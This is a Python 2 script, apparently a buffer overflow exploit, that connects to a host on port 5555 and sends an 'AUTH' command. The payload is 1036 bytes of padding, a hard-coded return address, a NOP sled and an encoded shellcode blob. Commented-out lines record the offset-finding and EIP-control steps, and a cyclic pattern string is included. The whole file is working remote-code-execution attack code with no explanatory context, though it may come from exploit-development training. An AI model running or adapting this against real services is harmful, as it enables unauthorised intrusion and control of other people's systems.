#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

chk_payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6B'
sht_payloade ='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab'

shellcode =\
("\xda\xde\xbb\x48\x20\xc9\x3d\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1" +
"\x52\x83\xee\xfc\x31\x5e\x13\x03\x16\x33\x2b\xc8\x5a\xdb\x29" +
"\x33\xa2\x1c\x4e\xbd\x47\x2d\x4e\xd9\x0c\x1e\x7e\xa9\x40\x93" +
"\xf5\xff\x70\x20\x7b\x28\x77\x81\x36\x0e\xb6\x12\x6a\x72\xd9" +
"\x90\x71\xa7\x39\xa8\xb9\xba\x38\xed\xa4\x37\x68\xa6\xa3\xea" +
"\x9c\xc3\xfe\x36\x17\x9f\xef\x3e\xc4\x68\x11\x6e\x5b\xe2\x48" +
"\xb0\x5a\x27\xe1\xf9\x44\x24\xcc\xb0\xff\x9e\xba\x42\x29\xef" +
"\x43\xe8\x14\xdf\xb1\xf0\x51\xd8\x29\x87\xab\x1a\xd7\x90\x68" +
"\x60\x03\x14\x6a\xc2\xc0\x8e\x56\xf2\x05\x48\x1d\xf8\xe2\x1e" +
"\x79\x1d\xf4\xf3\xf2\x19\x7d\xf2\xd4\xab\xc5\xd1\xf0\xf0\x9e" +
"\x78\xa1\x5c\x70\x84\xb1\x3e\x2d\x20\xba\xd3\x3a\x59\xe1\xbb" +
"\x8f\x50\x19\x3c\x98\xe3\x6a\x0e\x07\x58\xe4\x22\xc0\x46\xf3" +
"\x45\xfb\x3f\x6b\xb8\x04\x40\xa2\x7f\x50\x10\xdc\x56\xd9\xfb" +
"\x1c\x56\x0c\xab\x4c\xf8\xff\x0c\x3c\xb8\xaf\xe4\x56\x37\x8f" +
"\x15\x59\x9d\xb8\xbc\xa0\x76\xcd\x4b\xaa\x29\xb9\x49\xaa\x34" +
"\x81\xc7\x4c\x5c\xe5\x81\xc7\xc9\x9c\x8b\x93\x68\x60\x06\xde" +
"\xab\xea\xa5\x1f\x65\x1b\xc3\x33\x12\xeb\x9e\x69\xb5\xf4\x34" +
"\x05\x59\x66\xd3\xd5\x14\x9b\x4c\x82\x71\x6d\x85\x46\x6c\xd4" +
"\x3f\x74\x6d\x80\x78\x3c\xaa\x71\x86\xbd\x3f\xcd\xac\xad\xf9" +
"\xce\xe8\x99\x55\x99\xa6\x77\x10\x73\x09\x21\xca\x28\xc3\xa5" +
"\x8b\x02\xd4\xb3\x93\x4e\xa2\x5b\x25\x27\xf3\x64\x8a\xaf\xf3" +
"\x1d\xf6\x4f\xfb\xf4\xb2\x70\x1e\xdc\xce\x18\x87\xb5\x72\x45" +
"\x38\x60\xb0\x70\xbb\x80\x49\x87\xa3\xe1\x4c\xc3\x63\x1a\x3d" +
"\x5c\x06\x1c\x92\x5d\x03")
#req1 = "AUTH " + "\x41"*1072
#req1 = "AUTH " + "A" * 1036 + "B" * 4 + "D" * 4 + "C" * 50
EIP_addr = 'DEDE'
req1 = "AUTH " + "A" * 1036 + "B" * 4 + EIP_addr + "c" * 419
#req1 = "AUTH " + "A" * 1036 + "B" * 4 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
req1 = "AUTH " + "A" * 1036 + "B" * 4 + "\x71\x1d\xd1\x65" + "\x90" * 8 + shellcode
#65D11D71
#req1 = "LOGIN 31337\n"
#req1 = "AUTH " + chk_payload
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger connecting to " + server
s.close()